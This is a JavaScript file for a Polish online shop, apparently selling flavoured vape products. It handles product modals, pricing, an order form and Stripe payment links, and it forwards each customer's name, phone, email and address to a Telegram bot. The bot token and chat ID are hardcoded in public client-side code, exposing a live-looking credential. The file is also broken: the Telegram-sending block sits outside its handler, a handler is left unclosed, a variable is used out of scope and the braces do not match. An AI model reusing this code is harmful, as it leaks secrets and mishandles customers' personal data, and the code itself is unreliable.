document.addEventListener('DOMContentLoaded', () => {
    const modal = document.getElementById("productModal");
    const modalImage = document.getElementById("modalImage");
    const modalText = document.getElementById("modalText");
    const closeModal = document.querySelector("#closeProductModal");
    const quantityInput = document.getElementById("quantityInput");
    const orderModal = document.getElementById("orderModal");
    const closeOrderModal = document.querySelector("#closeOrderModal");
    const payNowButton = document.getElementById('payNowButton');
    const stripePayButton = document.getElementById('stripePayButton');
    const orderForm = document.getElementById('orderForm');
    const wholesaleBanner = document.getElementById("wholesaleBanner");
    const flavorSelect = document.getElementById('flavorSelect');

    let currentProductId = null;
    let currentPrice = 0;
    let currentLinks = {};
    let imageList = []; // Lista zdjęć
    let currentImageIndex = 0; // Indeks bieżącego zdjęcia

    // Token bota i chat ID (upewnij się, że zostały poprawnie ustawione)
    const botToken = '7268385791:AAEZeAc-jfVun4EEKdiOquB_jC-7vrBFupY';
    const chatId = '7025921907';

    // Funkcja do wysyłania wiadomości do Telegrama
    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            }),
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Wiadomość wysłana na Telegram');
            } else {
                console.error('Błąd wysyłania wiadomości:', data.description);
            }
        })
        .catch(error => console.error('Błąd:', error));
    }

      

    // Funkcja do aktualizacji tekstu przycisku "Zapłać teraz"
    function updatePayNowButtonText() {
        const selectedQuantity = parseInt(quantityInput.value, 10);
        if (isNaN(selectedQuantity) || selectedQuantity <= 0) {
            return;
        }

        const totalPrice = (currentPrice * selectedQuantity).toFixed(2);
        const deliveryFee = 15.00; // Koszt dostawy
        const finalPrice = (parseFloat(totalPrice) + deliveryFee).toFixed(2);

        payNowButton.textContent = `Zapłać teraz - ${totalPrice} PLN + 15 PLN dostawa`; // Aktualizacja tekstu przycisku
    }

    // Funkcja do aktualizacji zdjęcia w modalu
    function updateModalImage() {
        if (imageList.length > 0) {
            modalImage.src = imageList[currentImageIndex];
        }
    }

    // Obsługuje kliknięcia na produkty
    document.querySelectorAll(".product-item").forEach(item => {
        item.addEventListener('click', function() {
            const productId = this.getAttribute('data-product');
            currentPrice = parseFloat(this.getAttribute('data-price'));
            currentProductId = productId;
            currentLinks = {
                1: this.querySelector('.buyNowButton').getAttribute('data-link1'),
                2: this.querySelector('.buyNowButton').getAttribute('data-link2'),
                3: this.querySelector('.buyNowButton').getAttribute('data-link3'),
                4: this.querySelector('.buyNowButton').getAttribute('data-link4'),
                5: this.querySelector('.buyNowButton').getAttribute('data-link5'),
                6: this.querySelector('.buyNowButton').getAttribute('data-link6'),
                7: this.querySelector('.buyNowButton').getAttribute('data-link7'),
                8: this.querySelector('.buyNowButton').getAttribute('data-link8'),
                9: this.querySelector('.buyNowButton').getAttribute('data-link9'),
                10: this.querySelector('.buyNowButton').getAttribute('data-link10')
                
            };

            // Przygotuj listę zdjęć produktu z jedną nazwą zdjęcia
            imageList = [
                `product111.jpg`,
                `product2.jpg`,
                `product3.jpg`,
                `product4.jpg`,
                `product5.jpg`
            ];
            currentImageIndex = 0;

            // Ustaw dane w modalu
            if (modalImage && modalText) {
                updateModalImage();
                updatePayNowButtonText(); // Zaktualizuj tekst przycisku po ustawieniu danych
            }

            // Pokaż modal
            modal.classList.remove("hidden");
        });
    });

    // Obsługuje zamykanie modalu produktu
    if (closeModal) {
        closeModal.addEventListener("click", function() {
            modal.classList.add("hidden");
        });
    }

    // Obsługuje zmiany w ilości
    quantityInput.addEventListener('input', updatePayNowButtonText);

    // Obsługuje kliknięcia przycisku "Zapłać teraz" w modal
    payNowButton.addEventListener('click', () => {
        const selectedQuantity = parseInt(quantityInput.value, 10);
        if (isNaN(selectedQuantity) || selectedQuantity <= 0) {
            alert('Wprowadź poprawną ilość.');
            return;
        }

        // Ukryj modal produktu i pokaż modal zamówienia
        modal.classList.add("hidden");
        orderModal.classList.remove("hidden");

        // Wypełnij ukryte pole formularza z całkowitą kwotą
        document.getElementById('totalAmount').value = (currentPrice * selectedQuantity + 15).toFixed(2); // Dodanie kosztu dostawy

        // Resetuj formularz zamówienia
        orderForm.reset();

        // Zaktualizuj stan przycisku "Zapłać kartą"
        updateStripePayButtonState();
    });

    // Funkcja do zamykania modalu zamówienia
    if (closeOrderModal) {
        closeOrderModal.addEventListener("click", function() {
            orderModal.classList.add("hidden");
        });
    }

    // Funkcja do sprawdzania poprawności formularza
    function isFormValid() {
        const form = document.getElementById('orderForm');
        return form.checkValidity(); // Sprawdza poprawność formularza
    }

    // Funkcja do aktualizacji stanu przycisku "Zapłać kartą"
    function updateStripePayButtonState() {
        if (isFormValid()) {
            stripePayButton.classList.remove('inactive');
            stripePayButton.classList.add('active');
        } else {
            stripePayButton.classList.remove('active');
            stripePayButton.classList.add('inactive');
        }
    }

     // Wysyłanie danych do Telegrama
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const address = document.getElementById('address').value;
        const postalCode = document.getElementById('postalCode').value;
        const parcel = document.getElementById('parcel').value;
        const city = document.getElementById('city').value;
        const flavour = document.getElementById('flavorSelect').value;
        const sztuk = document.getElementById('quantityInput').value;
        const totalAmount = document.getElementById('totalAmount').value;

        const message = `
            **Nowe zamówienie**
            - Imię i nazwisko: ${name}
            - Nr telefonu: ${phone}
            - Email: ${email}
            - Adres: ${address}
            - Kod pocztowy: ${postalCode}
            - Nazwa/Adres paczkomatu: ${parcel}
            - Miejscowość: ${city}
            - Smak: ${flavour}
            - Sztuki: ${sztuk}
            - Kwota całkowita: ${totalAmount} PLN
        `;

        sendToTelegram(message);

        // Przekierowanie do Stripe
        window.location.href = paymentLink;
    });

    // Obsługuje zmiany w formularzu i aktualizuje stan przycisku "Zapłać kartą"
    orderForm.addEventListener('input', updateStripePayButtonState);

    // Obsługuje kliknięcia przycisku "Zapłać kartą" w modal
    stripePayButton.addEventListener('click', () => {
        if (!isFormValid()) {
            return; // Jeśli formularz jest niepoprawny, nic nie rób
        }

        const selectedQuantity = parseInt(quantityInput.value, 10);
        if (isNaN(selectedQuantity) || selectedQuantity <= 0) {
            alert('Wprowadź poprawną ilość.');
            return;
        }

        // Wybór odpowiedniego linku na podstawie ilości
        const paymentLink = currentLinks[selectedQuantity] || currentLinks[1]; // Domyślnie link dla jednej sztuki

    // Ograniczenie wartości w polu wejściowym
    quantityInput.addEventListener('input', function() {
        const maxQuantity = 10;
        if (this.value > maxQuantity) {
            this.value = maxQuantity;
        }
        updatePayNowButtonText(); // Zaktualizuj cenę przy zmianie wartości
    });

    // Obsługuje kliknięcia przycisków na stronie
    document.getElementById("productsButton").addEventListener("click", function() {
        document.querySelector("header").classList.add("small");
        document.querySelector(".buttons").style.display = "none";
        document.getElementById("products").classList.add("show");
        addBackButton();
        
        // Ukryj baner hurtowy
        if (wholesaleBanner) {
            wholesaleBanner.classList.add('hidden');
        }
    });

    document.getElementById("contactButton").addEventListener("click", function() {
        window.location.href = "https://twojalink.com";  // Zastąp "https://twojalink.com" właściwym linkiem

        // Ukryj baner hurtowy
        if (wholesaleBanner) {
            wholesaleBanner.classList.add('hidden');
        }
    });

    // Funkcja dodająca przycisk powrotu
    function addBackButton() {
        if (!document.getElementById('backButton')) {
            const backButton = document.createElement('button');
            backButton.id = 'backButton';
            backButton.textContent = 'Powrót';
            document.body.appendChild(backButton);

            backButton.addEventListener('click', handleBackButtonClick);
        }
    }

    // Obsługa powrotu
    function handleBackButtonClick() {
        document.querySelector('header').classList.remove('small');
        document.querySelector('.buttons').style.display = 'flex';
        document.getElementById('products').classList.remove('show');
        const backButton = document.getElementById('backButton');
        if (backButton) {
            backButton.removeEventListener('click', handleBackButtonClick);
            backButton.remove();
        }

        // Pokaż baner hurtowy ponownie
        if (wholesaleBanner) {
            wholesaleBanner.classList.remove('hidden');
        }
    }

    // Funkcja do rozwijania/ukrywania szczegółów hurtowych
    const toggleWholesaleDetailsButton = document.getElementById('toggleWholesaleDetails');
    const wholesaleDetails = document.getElementById('wholesaleDetails');

    if (toggleWholesaleDetailsButton) {
        toggleWholesaleDetailsButton.addEventListener('click', () => {
            if (wholesaleDetails.style.display === 'none' || wholesaleDetails.style.display === '') {
                wholesaleDetails.style.display = 'block';
                toggleWholesaleDetailsButton.textContent = 'Zwiń informacje';
            } else {
                wholesaleDetails.style.display = 'none';
                toggleWholesaleDetailsButton.textContent = 'Więcej informacji';
            }
        });
    }

    // Obsługuje kliknięcia strzałek do przewijania zdjęć
    document.getElementById('prevImage').addEventListener('click', () => {
        if (imageList.length > 0) {
            currentImageIndex = (currentImageIndex - 1 + imageList.length) % imageList.length;
            updateModalImage();
        }
    });

    document.getElementById('nextImage').addEventListener('click', () => {
        if (imageList.length > 0) {
            currentImageIndex = (currentImageIndex + 1) % imageList.length;
            updateModalImage();
        }
    });
});

// Funkcja otwierająca modal
function openModal(imageUrl) {
    document.getElementById('modalImage').src = imageUrl;
    document.getElementById('productModal').classList.remove('hidden');
}

// Funkcja zamykająca modal
function closeModal() {
    document.getElementById('productModal').classList.add('hidden');
}

// Przypisanie otwierania modalu do elementów produktu
document.querySelectorAll('.product-item').forEach(item => {
    item.addEventListener('click', () => {
        // Tutaj zmień logikę, aby zawsze używała 'product1.jpg'
        const imageUrl = 'images/product1.jpg';
        openModal(imageUrl);
    });

    
    function updateFlavorAvailability() {
        const options = flavorSelect.querySelectorAll('option');

        // Przykładowa dostępność smaków
        const availability = {
            "WaterMelon Ice / Blueberry Mint": 'unavailable',
            "Watermelon Ice / Strawberry Mango": 'unavailable',
            "Strawberry Watermelon / Kiwi Passion Fruit Guava": 'unavailable',
            "Strawberry watermelon / Grape Ice": 'available',
            "Blueberry Ice / Black Dragon Ice": 'available',
            "Blueberry Ice / Strawberry Banana": 'available',
            "Redbull / Blueberry Watermelon": 'available',
            "Redbull / Watermelon Bubble Candy": 'unavailable',
            "Blueberry Raspberry / Peach Mango Watermelon": 'unavailable',
            "Blueberry Raspberry / Mixed Moudly Fruit": 'available',
            "Strawberry Kiwi / Peach Ice": 'unavailable',
            "Strawberry Kiwi / Sour Apple Raspberry": 'available'
        };

        options.forEach(option => {
            const flavor = option.value;
            const availabilitySpan = option.querySelector('.availability');

            if (availability[flavor] === 'unavailable') {
                option.classList.add('unavailable');
                option.classList.add('pulse'); // Dodaj pulsowanie
                if (availabilitySpan) {
                    availabilitySpan.style.display = 'inline'; // Pokaż tekst "brak w magazynie"
                }
            } else {
                option.classList.remove('unavailable');
                option.classList.remove('pulse'); // Usuń pulsowanie
                if (availabilitySpan) {
                    availabilitySpan.style.display = 'none'; // Ukryj tekst "brak w magazynie"
                }
            }
        });
    }

    // Funkcja do aktualizacji stanu przycisku "Zapłać teraz"
    function updatePayNowButtonState() {
        const selectedFlavor = flavorSelect.value;
        const selectedOption = flavorSelect.querySelector(`option[value="${selectedFlavor}"]`);
        const isAvailable = !selectedOption.classList.contains('unavailable');

        payNowButton.classList.toggle('inactive', !isAvailable); // Dodaj klasę 'inactive', jeśli niedostępny
        payNowButton.classList.toggle('active', isAvailable);   // Dodaj klasę 'active', jeśli dostępny
        payNowButton.disabled = !isAvailable; // Wyłącz przycisk, jeśli smak jest niedostępny
    }

    // Inicjalizacja dostępności smaków
    updateFlavorAvailability();

    // Sprawdzanie dostępności przy wyborze smaku
    flavorSelect.addEventListener('change', updatePayNowButtonState);

    // Inicjalizuj stan przycisku przy ładowaniu strony
    updatePayNowButtonState();

    function disableProducts() {
        const disabledProductIds = ['2', '3', '4', '5']; // Identyfikatory produktów do wyłączenia

        disabledProductIds.forEach(id => {
            const product = document.querySelector(`.product-item[data-product="${id}"]`);
            if (product) {
                product.classList.add('disabled');
            }
        });
    }

    // Wywołanie funkcji po załadowaniu dokumentu
    disableProducts();

    modalText.textContent = `Produkt ${currentProductId}`;


});
